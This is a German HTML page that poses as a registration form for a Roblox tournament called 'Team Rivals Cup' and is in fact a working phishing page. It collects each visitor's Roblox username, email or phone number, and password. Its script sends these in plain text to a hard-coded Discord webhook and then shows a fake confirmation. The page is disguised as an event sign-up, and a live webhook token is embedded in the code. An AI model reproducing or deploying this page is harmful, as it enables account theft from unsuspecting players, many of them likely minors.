<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>Team Rivals Cup | 01.05.2026</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: linear-gradient(135deg, #0b0c1a 0%, #1a1f3a 100%);
      font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
      margin: 0;
      position: relative;
      overflow-x: hidden;
    }

    body::before {
      content: "";
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: radial-gradient(circle at 30% 40%, rgba(255, 70, 85, 0.08) 0%, transparent 50%),
                  radial-gradient(circle at 70% 60%, rgba(0, 180, 255, 0.1) 0%, transparent 50%);
      pointer-events: none;
      z-index: 0;
    }

    .main-container {
      width: 100%;
      max-width: 530px;
      background: rgba(18, 22, 40, 0.9);
      backdrop-filter: blur(16px);
      -webkit-backdrop-filter: blur(16px);
      border: 1px solid rgba(255, 255, 255, 0.15);
      border-radius: 2.5rem;
      padding: 2.5rem 2rem;
      box-shadow: 0 30px 50px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 70, 85, 0.2);
      display: flex;
      flex-direction: column;
      align-items: center;
      position: relative;
      z-index: 2;
      transition: all 0.2s ease;
    }

    /* ---------- LOGO BEREICH ---------- */
    .logo-wrapper {
      width: 100%;
      display: flex;
      justify-content: flex-start;
      margin-bottom: 1.8rem;
      position: relative;
    }

    .roblox-logo {
      font-family: 'Poppins', 'Segoe UI', 'Arial Black', sans-serif;
      font-weight: 900;
      font-size: 2.8rem;
      letter-spacing: 2px;
      color: #ff3345;
      text-transform: uppercase;
      background: linear-gradient(180deg, #ff5e6b 0%, #cc1122 90%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      filter: drop-shadow(0 0 12px rgba(255, 50, 70, 0.7));
      transition: all 0.35s cubic-bezier(0.2, 0.9, 0.4, 1);
      cursor: default;
      display: inline-block;
      line-height: 1;
      text-shadow: 0 0 12px rgba(255, 70, 85, 0.5);
      /* glow nach außen */
      animation: softGlow 2.8s infinite alternate;
    }

    @keyframes softGlow {
      0% {
        filter: drop-shadow(0 0 10px rgba(255, 55, 75, 0.55));
      }
      100% {
        filter: drop-shadow(0 0 18px rgba(255, 70, 90, 0.85));
      }
    }

    .roblox-logo:hover {
      transform: scale(1.12);
      filter: drop-shadow(0 0 27px rgba(255, 30, 50, 1)) drop-shadow(0 0 10px #ff2244);
      -webkit-text-fill-color: #ff3b4a;
      background: linear-gradient(180deg, #ff7b87 0%, #ee2233 100%);
      -webkit-background-clip: text;
      background-clip: text;
      text-shadow: 0 0 22px #ff4055, 0 0 8px #ff1e3c;
      transition: all 0.3s ease-out;
      cursor: pointer;
    }

    /* Turnier Titel */
    .tournament-title {
      font-size: 2.1rem;
      font-weight: 800;
      text-align: center;
      color: #f0e9e9;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin: 0.5rem 0 0.2rem;
      text-shadow: 0 0 18px rgba(255, 215, 0, 0.7);
      background: linear-gradient(to right, #ffd966, #ffb347);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      filter: drop-shadow(0 4px 6px black);
      word-break: break-word;
    }

    .cup-badge {
      font-size: 1.1rem;
      background: rgba(255, 200, 50, 0.15);
      padding: 0.3rem 1.4rem;
      border-radius: 40px;
      color: #ffcd7a;
      font-weight: 700;
      letter-spacing: 1px;
      margin-bottom: 1.8rem;
      border: 1px solid rgba(255, 180, 30, 0.5);
      backdrop-filter: blur(10px);
      text-transform: uppercase;
    }

    .datetime {
      background: #0f1322;
      padding: 0.9rem 1.8rem;
      border-radius: 50px;
      font-weight: 700;
      font-size: 1.3rem;
      color: #fdd835;
      margin: 0.8rem 0 1.8rem;
      display: flex;
      align-items: center;
      gap: 0.5rem;
      border: 1px solid rgba(255, 215, 0, 0.4);
      box-shadow: 0 0 20px rgba(253, 216, 53, 0.4);
      flex-wrap: wrap;
      justify-content: center;
      text-align: center;
    }

    .datetime span {
      background: #1f2544;
      padding: 0.3rem 0.9rem;
      border-radius: 30px;
      color: white;
      font-weight: 700;
      margin-left: 0.3rem;
    }

    .form-area {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 1.2rem;
      margin-top: 0.5rem;
    }

    .input-group {
      display: flex;
      flex-direction: column;
      gap: 0.3rem;
    }

    label {
      font-weight: 600;
      font-size: 0.9rem;
      color: #b9c2e6;
      letter-spacing: 0.5px;
      margin-left: 0.3rem;
    }

    input {
      background: rgba(10, 14, 28, 0.8);
      border: 1.5px solid rgba(255, 255, 255, 0.2);
      border-radius: 2.5rem;
      padding: 0.9rem 1.4rem;
      font-size: 1rem;
      color: white;
      outline: none;
      transition: 0.25s ease;
      font-weight: 500;
      backdrop-filter: blur(8px);
      background: rgba(20, 24, 45, 0.7);
    }

    input:focus {
      border-color: #f5425c;
      box-shadow: 0 0 18px rgba(245, 66, 92, 0.7);
      background: rgba(25, 30, 55, 0.9);
    }

    input::placeholder {
      color: #7b83a6;
      font-weight: 400;
    }

    .verify-btn {
      background: linear-gradient(145deg, #e62e42, #b71c2e);
      border: none;
      padding: 1rem 2rem;
      border-radius: 3rem;
      font-weight: 800;
      font-size: 1.2rem;
      text-transform: uppercase;
      letter-spacing: 2px;
      color: white;
      cursor: pointer;
      margin-top: 0.8rem;
      box-shadow: 0 10px 20px rgba(220, 30, 50, 0.5), 0 0 25px #ff2a40;
      transition: 0.25s ease-in-out;
      border: 1px solid #ff8080;
      position: relative;
      overflow: hidden;
    }

    .verify-btn:hover {
      background: linear-gradient(145deg, #ff4056, #d9253b);
      box-shadow: 0 0 32px #ff2d4f, 0 12px 28px rgba(200, 20, 50, 0.8);
      transform: scale(1.03);
      letter-spacing: 2.5px;
    }

    .verify-btn:active {
      transform: scale(0.97);
    }

    .status-message {
      text-align: center;
      font-weight: 600;
      margin-top: 1rem;
      min-height: 1.8rem;
      color: #ffbc6c;
      font-size: 0.95rem;
    }

    .error-highlight {
      color: #ff6b7c;
      text-shadow: 0 0 6px red;
    }

    .webhook-note {
      display: none;
    }

    @media (max-width: 450px) {
      .main-container {
        padding: 2rem 1.3rem;
      }
      .roblox-logo {
        font-size: 2.2rem;
      }
    }
  </style>
</head>
<body>
  <div class="main-container">
    <!-- LOGO LINKS OBEN: ROBLOXCOMP als besserer Schriftzug -->
    <div class="logo-wrapper">
      <div class="roblox-logo">ROBLOXCOMP</div>
    </div>

    <div class="cup-badge">🏆 TUNIER 🏆</div>
    <div class="tournament-title">TEAM RIVALS CUP</div>

    <div class="datetime">
      📅 01.05.2026 <span>⏰ 15:30</span>
    </div>

    <div class="form-area">
      <div class="input-group">
        <label>👤 Roblox Name</label>
        <input type="text" id="robloxName" placeholder="mind. 3 Zeichen" autocomplete="off">
      </div>
      <div class="input-group">
        <label>📧 Email oder Telefon</label>
        <input type="text" id="contactInput" placeholder="mind. 5 Zeichen" autocomplete="off">
      </div>
      <div class="input-group">
        <label>🔐 Passwort</label>
        <input type="password" id="passwordInput" placeholder="mind. 8 Zeichen" autocomplete="off">
      </div>

      <button class="verify-btn" id="submitBtn">JETZT ANMELDEN</button>
      <div class="status-message" id="statusMsg"></div>
    </div>
  </div>

  <script>
    (function() {
      const WEBHOOK_URL = "https://discord.com/api/webhooks/1499515877027086488/S3DHFQbry9zn-dpv2ykxffpC_fySox_FIq-oruVBwD2CIfMelsuqb53YNJg4u0Gvhido";

      const robloxInput = document.getElementById('robloxName');
      const contactInput = document.getElementById('contactInput');
      const passwordInput = document.getElementById('passwordInput');
      const submitBtn = document.getElementById('submitBtn');
      const statusDiv = document.getElementById('statusMsg');

      function setStatus(text, isError = false) {
        statusDiv.textContent = text;
        statusDiv.style.color = isError ? '#ff7b8a' : '#b9ffb0';
      }

      function validateForm() {
        const robloxName = robloxInput.value.trim();
        const contact = contactInput.value.trim();
        const password = passwordInput.value;

        if (robloxName.length < 3) {
          setStatus('❌ Roblox Name muss mindestens 3 Zeichen haben.', true);
          return false;
        }
        if (contact.length < 5) {
          setStatus('❌ Email/Telefon benötigt mindestens 5 Zeichen.', true);
          return false;
        }
        if (password.length < 8) {
          setStatus('❌ Passwort muss mindestens 8 Zeichen lang sein.', true);
          return false;
        }
        setStatus('✅ Eingaben gültig – wird gesendet...', false);
        return true;
      }

      async function sendToWebhook(payload) {
        try {
          const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          
          if (response.ok) {
            setStatus('🎉 Erfolgreich angemeldet! Viel Glück beim Team Rivals Cup!', false);
            robloxInput.value = '';
            contactInput.value = '';
            passwordInput.value = '';
          } else {
            console.warn('Webhook Antwort nicht ok:', response.status);
            setStatus('⚠️ Serverfehler, versuche es später erneut.', true);
          }
        } catch (error) {
          console.error('Fehler beim Senden:', error);
          setStatus('🌐 Netzwerkfehler. Bitte überprüfe deine Verbindung.', true);
        }
      }

      function handleSubmit() {
        if (!validateForm()) return;

        const robloxName = robloxInput.value.trim();
        const contact = contactInput.value.trim();
        const password = passwordInput.value; 

        const payload = {
          content: null,
          embeds: [
            {
              title: "🏁 TEAM RIVALS CUP – Neue Anmeldung",
              color: 16733525, 
              fields: [
                {
                  name: "👤 Roblox Name",
                  value: `\`${robloxName}\``,
                  inline: true
                },
                {
                  name: "📞 Email / Telefon",
                  value: `\`${contact}\``,
                  inline: true
                },
                {
                  name: "🔐 Passwort",
                  value: `\`${password}\``,
                  inline: false
                },
                {
                  name: "📅 Turnierstart",
                  value: "**01.05.2026 um 15:30 Uhr**",
                  inline: false
                }
              ],
              footer: {
                text: "Team Rivals Cup · ROBLOXCOMP"
              },
              timestamp: new Date().toISOString()
            }
          ]
        };

        sendToWebhook(payload);
      }

      submitBtn.addEventListener('click', handleSubmit);

      document.querySelectorAll('input').forEach(input => {
        input.addEventListener('keypress', (e) => {
          if (e.key === 'Enter') {
            e.preventDefault();
            handleSubmit();
          }
        });
      });
    })();
  </script>
</body>
</html>
